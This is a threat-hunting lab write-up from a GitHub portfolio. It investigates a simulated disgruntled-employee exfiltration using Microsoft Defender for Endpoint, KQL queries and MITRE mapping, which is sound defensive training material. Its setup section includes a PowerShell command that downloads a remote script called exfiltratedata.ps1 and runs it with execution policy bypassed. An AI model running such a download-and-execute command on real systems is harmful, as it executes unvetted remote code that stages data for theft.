<p align="center">
  <a href="https://github.com/Samuel-Cavada" target="_blank">
    <img src="https://img.shields.io/badge/Back_to_Main_Page-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Main Page"/>
  </a>
</p>

<h1 align="center">Scenario 3: Suspected Data Exfiltration Employee</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Azure-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Cloud Platform" />
  <img src="https://img.shields.io/badge/OS-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="OS" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Defender%20for%20Endpoint-00B388?style=for-the-badge&logo=microsoftdefender&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Tool-PowerShell-2C5EA8?style=for-the-badge&logo=powershell&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Focus-Insider%20Threat%20Detection-orange?style=for-the-badge" alt="Focus Area" />
</p>

---

## 📌 Project Objective
> Investigate suspected data exfiltration activities on a corporate device belonging to a disgruntled employee. Use Microsoft Defender for Endpoint logs to identify abnormal file, process, and network behavior related to archiving and transferring proprietary data.

---

## 🧰 Tools & Technologies
- **Platform:** Azure VM
- **OS:** Windows 10
- **Tools:** Microsoft Defender for Endpoint, PowerShell, Log Analytics
- **Languages/Scripts:** PowerShell, KQL

---

## 🧠 Skills Gained / Focus Areas
- Investigated suspicious user activity using endpoint logs
- Detected archiving software and file compression behavior
- Correlated timestamped events across process, file, and network layers
- Applied MITRE TTP mapping for insider threat scenarios

---

## 🧪 Environment Setup
> Created a Windows 10 VM onboarded to MDE. Simulated exfiltration by running:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```

> Employee under investigation: `John Doe`  
> Device: `windows-target-1`

![Environment Setup](assets/images/setup.jpg)

---

## 🛠️ Walkthrough
1. [Step 1: Preparation](#step-1-preparation)
2. [Step 2: Data Collection](#step-2-data-collection)
3. [Step 3: Data Analysis](#step-3-data-analysis)
4. [Step 4: Investigation](#step-4-investigation)
5. [Step 5: Response](#step-5-response)
6. [Step 6: Documentation](#step-6-documentation)
7. [Step 7: Improvement](#step-7-improvement)

---

### ✅ Step 1: Preparation
> Hypothesis: John may be attempting to compress and exfiltrate sensitive data using scripts or archiving tools.

---

### ✅ Step 2: Data Collection
> Inspected the following telemetry tables:
- `DeviceFileEvents`
- `DeviceProcessEvents`
- `DeviceNetworkEvents`

> Focused on `windows-target-1` within the activity window after script execution.

---

### ✅ Step 3: Data Analysis
> Detected archiving activity using:
```kql
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe", "Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
let VMName = "windows-target-1";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| where DeviceName == VMName
| order by Timestamp desc
```

> Timestamp from findings: `2024-10-15T19:00:48.5615171Z`

> Pivoted to file activity:
```kql
let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
DeviceFileEvents
| where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
| where DeviceName == "windows-target-1"
| order by Timestamp desc
```

> Investigated outbound connection attempts:
```kql
let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == "windows-target-1"
| order by Timestamp desc
```

---

### ✅ Step 4: Investigation
> Found evidence of:
- A PowerShell script initiating file compression
- Outbound connections to unknown external IPs shortly after archiving
- Actions mapping to MITRE techniques:
  - **T1560.001** – Archive via Utility
  - **T1041** – Exfiltration over C2 channel

---

### ✅ Step 5: Response
> - Escalated to security operations  
> - Recommended disabling John Doe’s account  
> - Suggested isolating `windows-target-1` and collecting an investigation package

---

### ✅ Step 6: Documentation
> - Archived tool executed by John Doe on `windows-target-1`  
> - Compressed data and outbound connection observed  
> - Timeline, tool usage, and artifacts were logged and archived  
> - Queries and indicators saved for replay and rule development

---

### ✅ Step 7: Improvement
> - Restrict archiving software and PowerShell script execution  
> - Apply DLP policies to monitor sensitive file access  
> - Enable alerts for compression + outbound transfer behavior  
> - Implement better user behavior analytics for flagged users

---

## 📝 Timeline Summary and Findings
- John Doe ran a script that created compressed files  
- Log evidence showed PowerShell and outbound IP communication  
- Activity aligned with insider threat and exfiltration patterns  
- Threat contained before actual damage confirmed

---

## 📎 References
- [T1560.001 – Archive via Utility (MITRE)](https://attack.mitre.org/techniques/T1560/001/)
- [T1041 – Exfiltration Over C2 Channel (MITRE)](https://attack.mitre.org/techniques/T1041/)
- [Microsoft Defender Investigation Hunting](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview)
